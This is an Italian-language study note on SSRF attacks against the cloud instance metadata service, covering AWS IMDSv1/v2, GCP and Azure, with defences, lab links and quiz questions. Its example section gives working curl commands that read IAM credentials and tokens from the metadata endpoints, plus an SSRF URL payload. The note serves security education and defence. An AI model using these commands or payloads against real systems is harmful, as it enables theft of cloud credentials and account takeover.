---
tipo: concetto
tag: [cloud, web, owasp]
fase: 4
fonti: 3
aggiornato: 2026-07-02
stato: maturo
aliases: ["SSRF e Metadata Service (IMDS)"]
---

# SSRF e Metadata Service (IMDS)

## In breve
Il **metadata service** (IMDS) è un endpoint HTTP link-local `169.254.169.254` raggiungibile solo dall'interno di una VM cloud, che espone metadati e — punto critico — le **credenziali temporanee** del ruolo associato. Una [[Server-Side Request Forgery (SSRF)|SSRF]] sull'app che gira su quella VM la costringe a interrogare l'IMDS *dall'interno*, esfiltrando quelle credenziali: è l'anello che salda una vulnerabilità web a una compromissione cloud completa (caso scuola: Capital One 2019). La difesa cardine è forzare **IMDSv2** (token via PUT + header, hop-limit 1).

## Definizione
Il **metadata service** è un endpoint HTTP non instradabile (link-local `169.254.169.254`)
raggiungibile **solo dall'interno** di una VM cloud, che espone informazioni sull'istanza e — punto
critico — le **credenziali temporanee** del ruolo associato. Una [[Server-Side Request Forgery (SSRF)|SSRF]] su un'app che gira su quella VM permette all'attaccante di far interrogare l'IMDS
*dall'interno*, esfiltrando quelle credenziali. È l'anello che salda una vulnerabilità web a una
compromissione cloud completa (caso scuola: breach Capital One 2019).

## Meccanismo
1. L'app web ha una SSRF (es. fetch di un URL fornito dall'utente).
2. L'attaccante fa puntare la richiesta a `http://169.254.169.254/...`.
3. L'app, che gira sulla VM, raggiunge l'IMDS e ne restituisce la risposta.
4. L'attaccante legge nome del ruolo → credenziali temporanee → usa AWS/Azure CLI come quel ruolo.

## Esempio pratico — furto credenziali via IMDS
```bash
# --- AWS IMDSv1 (vulnerabile: GET semplice, nessun token) ---
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# -> nome-del-ruolo
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/nome-del-ruolo
# -> { "AccessKeyId":..., "SecretAccessKey":..., "Token":... }

# --- AWS IMDSv2 (richiede prima un token PUT, poi header) ---
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

# --- GCP (header obbligatorio) ---
curl -s -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"

# --- Azure (vedi anche pagina Azure) ---
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```
Sfruttato via SSRF, il payload tipico è un parametro URL: `?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`.

## IMDSv1 vs IMDSv2
| | IMDSv1 | IMDSv2 |
|---|---|---|
| Metodo | GET diretto | PUT token → poi GET con header |
| Resistenza a SSRF | **No** (basta un GET) | **Sì** (SSRF raramente fa PUT + header custom) |
| Hop limit TTL | n/a | configurabile a 1 (blocca proxy/container) |

## Attacco / Difesa
| Vettore d'attacco | Contromisura difensiva |
|---|---|
| SSRF → IMDSv1 → furto credenziali | **Forzare IMDSv2** (`HttpTokens=required`) |
| Pivot da container a IMDS | `HttpPutResponseHopLimit=1`, network policy che blocca 169.254.169.254 |
| Credenziali temporanee abusate | Least privilege sul ruolo istanza; rilevamento `sts` anomalo (GuardDuty) |
| SSRF nell'app | Validare/allowlist URL, bloccare IP link-local e privati, no redirect |

```bash
# Difesa AWS: imporre IMDSv2 su un'istanza esistente
aws ec2 modify-instance-metadata-options --instance-id i-0abc \
  --http-tokens required --http-put-response-hop-limit 1
```

## Lab
- **flaws2.cloud** (lato attacker: SSRF → metadata) — http://flaws2.cloud/
- **CloudGoat** scenario *ec2_ssrf* — https://github.com/RhinoSecurityLabs/cloudgoat
- **PortSwigger Web Security Academy — SSRF** — https://portswigger.net/web-security/ssrf (incl. cloud metadata)
- **HackTricks Cloud — SSRF / Metadata** — https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-ec2-ebs-ssm-and-vpc-unauthenticated-enum.html

> [!warning] Etica
> Punta a `169.254.169.254` solo su VM/app **di tua proprietà** o lab (flaws2.cloud, PortSwigger).
> Lo sfruttamento di SSRF su sistemi terzi è accesso abusivo a sistema informatico.

## Domande
**D: Cos'è l'IMDS e perché è un bersaglio così prezioso?**
R: L'Instance Metadata Service (`169.254.169.254`) espone metadati e, soprattutto, le **credenziali
temporanee del ruolo IAM** dell'istanza. Via [[Server-Side Request Forgery (SSRF)|SSRF]] si leggono e
si usano da fuori → pivot diretto nell'account cloud.

**D: Differenza tra IMDSv1 e IMDSv2?**
R: v1 risponde a una semplice GET (sfruttabile da SSRF "ciechi"); v2 richiede prima un **token** via
PUT con header e TTL/hop-limit, rendendo molto più difficile l'abuso via SSRF. Andrebbe forzato v2.

**D: Oltre a IMDSv2, come si mitiga l'esfiltrazione via IMDS?**
R: Hop limit = 1 (blocca l'inoltro da container), disabilitare IMDS se non serve, egress filtering, e
correggere la SSRF a monte (allowlist di destinazioni, blocco di IP link-local).

## Collegamenti
- [[Server-Side Request Forgery (SSRF)]]
- [[AWS Sicurezza (S3, EC2, IAM, STS)]]
- [[Azure e Entra ID Sicurezza]]
- [[Privilege Escalation in Cloud]]
- [[Logging e Detection Cloud (CloudTrail)]]

## Fonti
- AWS — Use IMDSv2: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html
- PortSwigger — SSRF & cloud metadata: https://portswigger.net/web-security/ssrf
- MITRE ATT&CK — T1552.005 Cloud Instance Metadata API: https://attack.mitre.org/techniques/T1552/005/
